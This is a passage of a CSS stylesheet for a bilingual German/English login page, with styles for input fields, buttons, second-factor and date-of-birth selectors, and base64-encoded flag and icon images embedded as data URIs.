wyMC41MjR6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNy43NjcsMTguNzM2aC0wLjg5NGMtMC4yNDYsMC0wLjQ0NywwLjItMC40NDcsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2gwLjg5NA0KCQljMC4yNDYsMCwwLjQ0Ny0wLjIwMSwwLjQ0Ny0wLjQ0N3YtMC44OTVDMTE4LjIxNCwxOC45MzcsMTE4LjAxMywxOC43MzYsMTE3Ljc2NywxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMC4zMDEsMTguNzM2aC0wLjg5NWMtMC4yNDYsMC0wLjQ0NywwLjItMC40NDcsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2gwLjg5NQ0KCQljMC4yNDYsMCwwLjQ0Ni0wLjIwMSwwLjQ0Ni0wLjQ0N3YtMC44OTVDMTIwLjc0NywxOC45MzcsMTIwLjU0NywxOC43MzYsMTIwLjMwMSwxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMi44MzMsMTguNzM2aC0wLjg5NWMtMC4yNDYsMC0wLjQ0NiwwLjItMC40NDYsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIsMC40NDcsMC40NDYsMC40NDdoMC44OTUNCgkJYzAuMjQ2LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1QzEyMy4yOCwxOC45MzcsMTIzLjA3OSwxOC43MzYsMTIyLjgzMywxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExMC4xNjcsMjEuMjdoLTAuODk0Yy0wLjI0NiwwLTAuNDQ2LDAuMjAxLTAuNDQ2LDAuNDQ2djAuODk1YzAsMC4yNDYsMC4yLDAuNDQ3LDAuNDQ2LDAuNDQ3aDAuODk0DQoJCWMwLjI0NiwwLDAuNDQ4LTAuMjAxLDAuNDQ4LTAuNDQ3di0wLjg5NUMxMTAuNjE1LDIxLjQ3MSwxMTAuNDEzLDIxLjI3LDExMC4xNjcsMjEuMjd6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNy43NjcsMjEuMjdoLTUuOTZjLTAuMjQ2LDAtMC40NDcsMC4yMDEtMC40NDcsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2g1Ljk2DQoJCWMwLjI0NiwwLDAuNDQ3LTAuMjAxLDAuNDQ3LTAuNDQ3di0wLjg5NUMxMTguMjE0LDIxLjQ3MSwxMTguMDEzLDIxLjI3LDExNy43NjcsMjEuMjd6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMC4zMDEsMjEuMjdoLTAuODk1Yy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ2djAuODk1YzAsMC4yNDYsMC4yMDEsMC40NDcsMC40NDcsMC40NDdoMC44OTUNCgkJYzAuMjQ2LDAsMC40NDYtMC4yMDEsMC40NDYtMC40NDd2LTAuODk1QzEyMC43NDcsMjEuNDcxLDEyMC41NDcsMjEuMjcsMTIwLjMwMSwyMS4yN3oiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMTIyLjgzMywyMS4yN2gtMC44OTVjLTAuMjQ2LDAtMC40NDYsMC4yMDEtMC40NDYsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIsMC40NDcsMC40NDYsMC40NDdoMC44OTUNCgkJYzAuMjQ2LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1QzEyMy4yOCwyMS40NzEsMTIzLjA3OSwyMS4yNywxMjIuODMzLDIxLjI3eiIvPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMjMuNTg1LDE0LjA3aC0xNS4wNjNjLTEuMjksMC0yLjMzOSwxLjA0OS0yLjMzOSwyLjM0djYuNDM5YzAsMS4yOSwxLjA0OSwyLjM0MSwyLjMzOSwyLjM0MWgxNS4wNjMNCgkJYzEuMjksMCwyLjMzOS0xLjA1MSwyLjMzOS0yLjM0MVYxNi40MUMxMjUuOTI0LDE1LjExOSwxMjQuODc1LDE0LjA3LDEyMy41ODUsMTQuMDd6IE0xMjQuNTUsMTYuNTR2Ni4xOA0KCQljMCwwLjc0MS0wLjYwNCwxLjM0My0xLjM0NCwxLjM0M2gtMTQuMzA1Yy0wLjc0MSwwLTEuMzQ0LTAuNjAyLTEuMzQ0LTEuMzQzdi02LjE4YzAtMC43NCwwLjYwMy0xLjM0MywxLjM0NC0xLjM0M2gxNC4zMDUNCgkJQzEyMy45NDYsMTUuMTk3LDEyNC41NSwxNS44LDEyNC41NSwxNi41NHoiLz4NCjwvZz4NCjwvc3ZnPg0K);
}
html.oldie .hasBgImage{
    background-image: url(data:image/png;base64,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);
}
span.icon{
    cursor:pointer;
    position:absolute;
    display:block;
    top:0;
    left:0;
    width:40px;
    height:40px;
    border:solid 1px #ccd7e1;
    border-top-left-radius:3px;
    border-bottom-left-radius:3px;
      } 
span.numbericon{
    background-position:8px 6px; 
    }
span.passwordicon{
    background-position:-24px 6px; 
    }
div.submit{
    margin:0 -14px;
    }
div.submit > input.submit{
    width:100%; 
    text-align:center;
    bottom:0;
    background:#0d5487;
    border:none;
    outline:none;
    color:#fff;
    border-bottom-left-radius:3px;
    border-bottom-right-radius:3px;
    padding:12px 0;
    cursor:pointer;
    font-family:'open_sansregular',Arial,sans-serif;
    font-weight:400;
    font-size:1.75rem;
    line-height:1.5rem;
}
div.submit > input.submitWithCancel{
 width:100%; 
 text-align:center;
 position:absolute;
 bottom:48px;
 background:#0d5487;
 border:none;
 outline:none;
 color:#fff;
 border-top-left-radius:0;
 border-top-right-radius:0;
 padding:12px 0;
 cursor:pointer;
 font-family:'open_sansregular',Arial,sans-serif;
 font-weight:400;
 font-size:1.75rem;
 line-height:1.5rem;
}
div.submit > input.cancel{
width:100%; 
 text-align:center;
 position:absolute;
 bottom:0;
 background:#c0c0c0;
 border:none;
 outline:none;
 color:#fff;
 border-bottom-left-radius:3px;
 border-bottom-right-radius:3px;
 padding:12px 0;
 cursor:pointer;
 font-family:'open_sansregular',Arial,sans-serif;
 font-weight:200;
 font-size:1.75rem;
 line-height:1.5rem;
}
 div.submit > input.submitFollowedByCancel{
    width:100%; 
    text-align:center;
    position:absolute;
    bottom:50px;
    background:#0d5487;
    border:none;
    outline:none;
    color:#fff;
    border-bottom-left-radius:3px;
    border-bottom-right-radius:3px;
    padding:12px 0;
    cursor:pointer;
    font-family:'open_sansregular',Arial,sans-serif;
    font-weight:400;
    font-size:1.75rem;
    line-height:1.5rem;
}

input.submit.disabled, input.submitWithCancel.disabled, input.submitFollowedByCancel.disabled, input.button.disabled{
	cursor:not-allowed !important;
}

.theform{
    overflow:hidden;
    }
input{
    padding:5px;
    font-family: 'open_sansregular', Arial, sans-serif;
    }
select{
    font-family: 'open_sansregular', Arial, sans-serif;
    }
.hidden{
    display:none !important;
    } 
input::-webkit-outer-spin-button,input::-webkit-inner-spin-button {
    -webkit-appearance: none; 
    margin: 0;
    }   
input::-o-outer-spin-button,
input::-o-inner-spin-button {
    -o-appearance: none;
    margin: 0;
}
input:focus{
    outline:none;
    } 
.infotext,.infotext a{
    display:none;
    font-size:.90rem;
    padding-bottom:12px;
    }    
.commontext{
    font-family: 'open_sansregular',Arial,sans-serif;
    padding-bottom:12px;
    }
.keyboard{
    float:right;
}        
.keyboard a{
    font-size:.875rem; 
    color:#ccd7e1;
    text-align:right;
    text-decoration:none;
    line-height:1.5rem;
    } 

a.helpkeyboard:after{
    content:" ";
    width: 16px;
    height: 16px;
    background-position: -89px -9px;
    display: inline-block;
    cursor:pointer;
}
.commonalert{
    display:none;
}
.iealert{
    color:orange;
    padding-bottom:12px;
}
.bottomlinks{
    clear:left;
    margin-left:50%;
    padding-top:12px;
}
.producticon{
    display:none;
}
.links{
    padding-top:12px;
    line-height:1.5rem;
    }
div.col2 .links{
    top:320px;
    position:relative;
}    
.language{
    width:100%;
    text-align:right;
    display:block;
    height:36px;
}

.language a{
    width:36px;
    height:24px;
    display:inline-block;
    background-repeat:no-repeat;
    background-position:center;
    border-radius:4px;
}
.language .lang_en{
    background-size:cover;
    margin:0 6px 0 0;
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAAAYCAYAAABwZEQ3AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA5hJREFUeNrslm1IU2EUx/+bd1lOTShzJYViL+QyDTTDCCU1IjRmJQYlakRkr5haEFTmlyIFMe3FwgwqqBYIKb0Xqw9GGjYrBYvawKyZvevEnNt6zpNburm2rn3oQwc2uM+959z/+d3znPNIPqdvDAi4fFoFIJL9ogr3a9DyvBvuLHJeIA6tnYreolL72vj0lVBbwnDuUqtb/4CJ3jixKQRC9VlYv/Xo2VK5wP5qenYXqyZkZ0AIn4OS4gQWrM2jgGItbmEwtinewausAlZ2LSjnwGdzlkqQxUSpTE1anqH3iiSWXSoyM8KZwzScrNF6RMlT85XLkJeqQNTjWzA3d0Ai9+Hvo/cSLGmBYTYMa9bxG9+v3QGjhMG2doSFBnBKuRuieJC/QeNUohkRV6ph1ndwGn5H9nMhvUYTTpzRQnil+4IdOmB9SiZWf3wER0ppKbM4pdLKJlGU3NBAQ2MnSiuauCDB5nS+XoeHobOxc40SU6/Xckqmpifw2ZqDoKFaqq1/yWuJHD2x5NgpyPbrgIxosGtWEvDZksMFUQwSQWJsJgx3/hNKv7OgKXLkLfXHzPv1sHR/5C8nESTGkcZwkySnXbaOFpBqZmesjFOyGvsgDZwEeeFWeIVM5/eftnYjXPLJaWt3Ri+B//V6yDT3+Zo7GiPEWJmJLUoqdEcxRFCsCf3qOtHOlu4PTuL61eJ3nIR1YCv+EZPiH7L/YlwWMO2AsRTwgKbhVzDW4mnYjkGM+K1Iu2eEGCZkTFt72Sq1yy5atCeONz8yGg/UBqgBUuPrzcpGoMTZr+u9EXL5OD6TqPsaS47xwUhNb3DFchx+NsHljPMKm5te5LhIbX/vrkVQMEE8YOlxDNxmHdVk4gHLzZF4oP2ApHl+Tp+pTifF0apmzGRJKEImwzs5/qeQtheQaJ9iadAAJirD0P5+EAMmy0gyjjQKt8dgvjJwVBra6GUoqzOwtt7JT3qujOgU7NPwpDIzlPBls00WswB9x2sw2NqOJLQjgSVVaQgefVDaHYfw2hwpq6/xiajsUqDlYscf1QBN+YbGt/YEfQ8U2BMUrt1APkswca0tQXaEcKRBD/arr9qx35yxGBfudbGHxZ343FGK0Ffj1BAl+6CkIqMHbMVGNCpe+7ssNjEHcndlQJ9JwxYSnGjcFU9DLCWpsawqjwnREw1z+iocNEejqu6Nx6c5MUa1lJt/mx/m6JzEaukLo5rzQ4ABAJwP7F5kZ2UKAAAAAElFTkSuQmCC);
    background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNS4xLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iMzVweCIgaGVpZ2h0PSIyMy41cHgiIHZpZXdCb3g9IjU3OC4xMzkgMjk3LjY2OSAzNSAyMy41IiBlbmFibGUtYmFja2dyb3VuZD0ibmV3IDU3OC4xMzkgMjk3LjY2OSAzNSAyMy41Ig0KCSB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxwYXRoIGZpbGw9IiNGRkZGRkYiIGQ9Ik02MTMuMTM5LDMxOC4xMzZjMCwzLjAzMy0xLjQ0LDMuMDMzLTMuNzgxLDMuMDMzaC0yNy4zOTNjLTMuODI2LDAtMy44MjYtMS43MDYtMy44MjYtMi45MTZ2LTE3LjcxNQ0KCWMwLTEuNTIxLDAtMi44NjksNC4yOTUtMi44NjloMjYuNTczYzQuMTMyLDAsNC4xMzIsMS4wMzUsNC4xMzIsMi43MTNWMzE4LjEzNnoiLz4NCjxwYXRoIGZpbGw9IiNFRjU1NjQiIGQ9Ik02MTIuNTA4LDMyMC40NjhjMC4zNTQtMC4zNzIsMC41OC0wLjg2NCwwLjYxNS0xLjQwOWwtOC41OTgtNS43MDFoLTIuNzQ2TDYxMi41MDgsMzIwLjQ2OHoiLz4NCjxwb2x5Z29uIGZpbGw9IiNFRjU1NjQiIHBvaW50cz0iNTk3LjQ4LDMwNi44NDMgNTk3LjQ4LDI5Ny42NjkgNTkzLjc5OSwyOTcuNjY5IDU5My43OTksMzA2Ljg0MyA1NzguMTM5LDMwNi44NDMgNTc4LjEzOSwzMTEuNzI5IA0KCTU5My43OTksMzExLjcyOSA1OTMuNzk5LDMyMS4xNjkgNTk3LjQ4LDMyMS4xNjkgNTk3LjQ4LDMxMS43MjkgNjEzLjEzOSwzMTEuNzI5IDYxMy4xMzksMzA2Ljg0MyAiLz4NCjxwYXRoIGZpbGw9IiNFRjU1NjQiIGQ9Ik01ODkuNDk4LDMxMy4zNTdsLTEwLjcyNSw3LjEwOWMwLjQxMiwwLjQzMiwwLjk5LDAuNzAxLDEuNjMzLDAuNzAxaDAuMDU3bDExLjc4MS03LjgxM0w1ODkuNDk4LDMxMy4zNTcNCglMNTg5LjQ5OCwzMTMuMzU3eiIvPg0KPHBhdGggZmlsbD0iI0VGNTU2NCIgZD0iTTU4Ni43NTQsMzA1LjIxM2gyLjc0NGwtMTAuNTU1LTYuOTk2Yy0wLjM4OSwwLjMzMi0wLjY2OCwwLjc4OC0wLjc2NCwxLjMxM0w1ODYuNzU0LDMwNS4yMTN6Ii8+DQo8cGF0aCBmaWxsPSIjRUY1NTY0IiBkPSJNNjEwLjQxNCwyOTcuNjY5bC0xMS4zODEsNy41NDRoMi43NDZsMTAuNTU1LTYuOTk2Yy0wLjM5Ni0wLjMzNy0wLjktMC41NDgtMS40NjMtMC41NDhINjEwLjQxNHoiLz4NCjxwb2x5Z29uIGZpbGw9IiM0NTUxQUEiIHBvaW50cz0iNTc4LjEzOSwzMDAuNDEzIDU3OC4xMzksMzA1LjIxMyA1ODUuMzgxLDMwNS4yMTMgIi8+DQo8cG9seWdvbiBmaWxsPSIjNDU1MUFBIiBwb2ludHM9IjU5Mi41NjgsMzIxLjE2OSA1OTIuNTY4LDMxNC4wNTMgNTgxLjgzNCwzMjEuMTY5ICIvPg0KPHBvbHlnb24gZmlsbD0iIzQ1NTFBQSIgcG9pbnRzPSI1ODUuMzgxLDMxMy4zNTcgNTc4LjEzOSwzMTMuMzU3IDU3OC4xMzksMzE4LjE1NiAiLz4NCjxwb2x5Z29uIGZpbGw9IiM0NTUxQUEiIHBvaW50cz0iNTk4LjcwOSwyOTcuNjY5IDU5OC43MDksMzA0LjUxOCA2MDkuMDQxLDI5Ny42NjkgIi8+DQo8cG9seWdvbiBmaWxsPSIjNDU1MUFBIiBwb2ludHM9IjYwNS44OTgsMzA1LjIxMyA2MTMuMTM5LDMwNS4yMTMgNjEzLjEzOSwzMDAuNDEzICIvPg0KPHBvbHlnb24gZmlsbD0iIzQ1NTFBQSIgcG9pbnRzPSI2MTMuMTM5LDMxOC4xNTcgNjEzLjEzOSwzMTMuMzU3IDYwNS44OTgsMzEzLjM1NyAiLz4NCjxwb2x5Z29uIGZpbGw9IiM0NTUxQUEiIHBvaW50cz0iNTk4LjcwOSwzMTQuMDUzIDU5OC43MDksMzIxLjE2OSA2MDkuNDQzLDMyMS4xNjkgIi8+DQo8cG9seWdvbiBmaWxsPSIjNDU1MUFBIiBwb2ludHM9IjU5Mi41NjgsMjk3LjY2OSA1ODIuMjM2LDI5Ny42NjkgNTkyLjU2OCwzMDQuNTE4ICIvPg0KPC9zdmc+DQo=);
}

.language .lang_de{
    background-size:cover;
    margin:0 6px 0 0;  
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACUAAAAZCAYAAAC2JufVAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAG9JREFUeNpifB+aIsDAwDAfiAMYBh58AOJCJiDRP0gcBALgAAI5SoFhkAEmhkEIRh016ihqA8b////vB9IOoyE16qhRR406apA6iuXH6s2D0VGbRqNv1FGjjhooR10YjI5qBOIFg8Q9oH5fIkCAAQBg9xHU4ifAIgAAAABJRU5ErkJggg==);
    background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNS4xLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iMzYuODM0cHgiIGhlaWdodD0iMjQuNzNweCIgdmlld0JveD0iNDI1LjI4OCAyODQuOTkzIDM2LjgzNCAyNC43MyIgZW5hYmxlLWJhY2tncm91bmQ9Im5ldyA0MjUuMjg4IDI4NC45OTMgMzYuODM0IDI0LjczIg0KCSB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxwYXRoIGZpbGw9IiNFRjU1NjQiIGQ9Ik00NTkuNzM1LDI4NC45OTNoLTMyLjA1OGMtMS4zMTgsMC0yLjM4OSwxLjA2OC0yLjM4OSwyLjM4NnY1LjcwOWgzNi44M3YtNS43MDkNCglDNDYyLjEyLDI4Ni4wNjIsNDYxLjA1MywyODQuOTkzLDQ1OS43MzUsMjg0Ljk5M3oiLz4NCjxyZWN0IHg9IjQyNS4yOTIiIHk9IjI5My4wODkiIGZpbGw9IiNGRkZGRkYiIHdpZHRoPSIzNi44MjgiIGhlaWdodD0iOC4zOTUiLz4NCjxwYXRoIGZpbGw9IiNFRjU1NjQiIGQ9Ik00MjUuMjkyLDMwMS40ODN2NS44NTNjMCwxLjMxOCwxLjA2NiwyLjM4OCwyLjM4NywyLjM4OGgzMi4wNThjMS4zMTcsMCwyLjM4Ni0xLjA2OCwyLjM4Ni0yLjM4OHYtNS44NTMNCglINDI1LjI5MnoiLz4NCjwvc3ZnPg0K);
}

body.de .language .lang_de,
body.en .language .lang_en{
    display:none;
    /*opacity:0.60;*/
    
    }
div.isSmallScreen{
        display:none;
        }
.flipicon {
    width: 30px;
    height: 27px;
    background-position: -58px 0;
    display: block;
    position: relative;
    top: 0px;
    right: 0px;
    cursor:pointer;
    float:right;
}
.center{
    width:80%;
    text-align:center;
    margin:5px auto 10px auto;
}
.center img{
    width:100%;
}
.text{
    padding:12px 0;
    line-height:1.125rem;
}

a.disabled {
    cursor: not-allowed;
    background-image: none;
    opacity: 0.65;
    filter: alpha(opacity=65);
    -webkit-box-shadow: none;
    -moz-box-shadow: none;
    box-shadow: none;
    color: #333;
}

#selectAuthMethod {
	top: 0;
	left: 0;
	border: solid 1px #ccd7e1;
	border-radius: 3px;
	height: 40px;
	margin: 0;
	padding: 5px 9px;
	width: 270px;
	font-size: 16px;
	color: #555;
	-webkit-appearance: menulist;
}

div.secappSecondfactor {
	margin-top: 10px;
	margin-bottom: 6px;
}

p.secappSecondfactor {
	margin-bottom: 8px;
}

select.dateOfBirth {
	top: 0;
	left: 0;
	border: solid 1px #ccd7e1;
	border-radius: 3px;
	height: 40px;
	padding: 5px;
	font-size: 16px;
	color: #555;
	-webkit-appearance: menulist;
}

select.dateOfBirthDay {
	margin-right: 6px;
	width: 86px;
}

select.dateOfBirthMonth {
	margin-right: 6px;
	width: 86px;
}

select.dateOfBirthYear {
	width: 86px;
}

p.verificationCodeInput {
	margin-top: 10px;
	margin-bottom: 8px;
}

/************************************************************************
* SONDERKLASSEN do the flip
************************************************************************/
div.whitebox-info, div.whitebox{
    -ms-backface-visibility: hidden;
    -webkit-backface-visibility: hidden;
    -moz-backface-visibility: hidden;
    backface-visibility: hidden;
}
div.whitebox{
    -ms-transition: all 1s ease 0s;
    -webkit-transition: all 1s ease 0s;
    transition: all 1s ease 0s;
    -webkit-transform: rotateY(0deg);
    -ms-transform: rotateY(0deg);
    transform: rotateY(0deg);
    z-index: 2;
}
div.whitebox-info{
    -webkit-transform: rotateY(180deg);
    -ms-transform: rotateY(180deg);
    transform: rotateY(180deg);
    -ms-transition: all 1s ease 0s;
    -webkit-transition: all 1s ease 0s;
    transition: all 1s ease 0s;
}
.doflip div.whitebox {
    -webkit-transform: rotateY(180deg);
    -ms-transform: rotateY(180deg);
    transform: rotateY(180deg);
}

.doflip div.whitebox-info {
    -webkit-transform: rotateY(0deg);
    -ms-transform: rotateY(0deg);
    transform: rotateY(0deg);
}
/************************************************************************
* SONDERKLASSEN Produkt hat ein Icon
************************************************************************/
body.hasIcon .producticon{
    display:block;
    width:60px;
    height:60px;
    position:absolute;
    left:0;
}
body.hasIcon .product{
    padding-left:75px;
    position:relative;
}
/************************************************************************
* SONDERKLASSEN Email Login
************************************************************************/
body.email div.keyboard {
		display:none;
}
body.email span.numbericon{
    background:none;
}
body.email span.numbericon:before{
    content:"@";
     width:40px;
    height:40px;
    font-size:24px;
    color:#ccd7e1;
    text-align:center;
    padding-top:8px;
    display:block;
}
/************************************************************************
* SONDERKLASSEN  Login Error
************************************************************************/
body.loginerror .infotext{
    display:block;
    color:#cc0000;   
}
body.loginerror .infotext:before{
    content:" ";
    display:inline-block;
    top:0;
    left:0;
    width:17px;
    height:15px;
    background-repeat:no-repeat;
    background-color:#fff;
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKMAAAAbCAYAAAAQ9T+YAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAABYhJREFUeNrsm71y4joUgL2Z9Ov7BOuUt3Nm6NeUVMATBJ4AUlMYitTAE+B9gnirlHb6zCy32jLkDbxPkHtOfJQIRbKPjcwuG58ZDeAfSZY+nT8Zx2mllVZaaWVfPnEvfPj5FMBHIB2KOv9+2R2jk9C2R217dCiDkkL723YKPxCMAIILH7cKiEJWAMR1gxBi20soI8MlKZTrxqDszbDdPhRfWgiviwHKdyixc3eTtSgdB8bEAKKQBcAwbwjEhEAoEgShaxXIHEJcBC7jamx/DUDOW5wahBGAQBB+lE0GgPBPAzCiNh5oNKFDgMqg7KAPFxYgxDo3mnY5gouh22rJ+nJWcp6jGdwGQPQUIHCCLwE41IBd+H5Bky/Eg3tGFkBMCkDMCDZcwJf0Wxb/5f68nlYagPF3iQrEUDbD8D0HY1/6B7Z5W+ISRABirpnvbrAvOl/ZJ6BbaQBGn1MJmXObsqddAL5UvYCATK1o6NxHDCz13Yf6Wv+xARivmPVcnfg4LBnXTAGyKcE7KLln0ppr+zB6zHq8kx2BXCu6bGh7s2cy6W6JZh+1eFWT85LzC4bWyFMbdmWnmOCiCFb3vYr0Gc8XQ3mC8pkg48CL1mLVIsYXTp7xtiTVgUnn0x303uyxQLNj0DLWRN2PLCDzyLsVizCiJtgUXHJhY1uQ0U4Vwa3KMRPG54KzQjvf7yW1e7OyjYDXsYH7di1mML+UZei8z4KwzTRGrRGAEhq0h839aZtBEII9tlDPoRG2Ry6HbvF5ztt+O0K/pQzB3wjia7YCv3fQ4tSBUfLhdDA+fZCFfa/85qayMgOEGwV0XOwZnFsXba2S9eBuU5bN5/AYL5o85H0N5WeFY3FHMzZcGE0P//nIUMQ0wQPH3s5Pxqgrlky0z247T47LMImkuGsY4xCu+VLgYohgcmzSuAzxqR5cEJdHmLOposg8OvZu0Z0VrEIXyhTKY4EmwPPJwVtxPMGVPKSJ6uq0Tk1JS2Hdh4q7b701wORKmYqIoJLhG8F4DgqUQkTPnkhgiVRTQtmBiXJsQiWh500raPdDtKJH7eb+c15QJg8aS3umgdCHsqGIcemU5xDR3GwQWihzMkO2Bf2pWPJjt47B76gh39laMZevdSAnrRhofErhV8aK2TbJL82cuBLknubY75JQ9KGDL7O8aXNX94zn0mANiOK6TrtHDaCpQVDWFn0SXCCu4uAHluqOS/ywp5pBjZp7HWgm6gVa3O6E51tW8Ekj6m8q+fOx8nmvOfbfAea9qlYMnOLE/wiu+daRFu05gbgkO24zmkVzM5Q12oGSCB+H+mvHzOArX73ZukQbqfC6JWCumCkdnIgxWaIqzzOV+hsq2uar1DfdsdQ5joQaOHeaa1JVM04b6tBEY+Zqa8ca0SwXyDkA2TfU24dzq9f3FO9uhvDbI5/MFKkuOJE1aavHmtpcwJxJvqTsq94bjh0jgh4ZFqrqXgRyquec/tvSlATO6UjX0e+s5C8Y92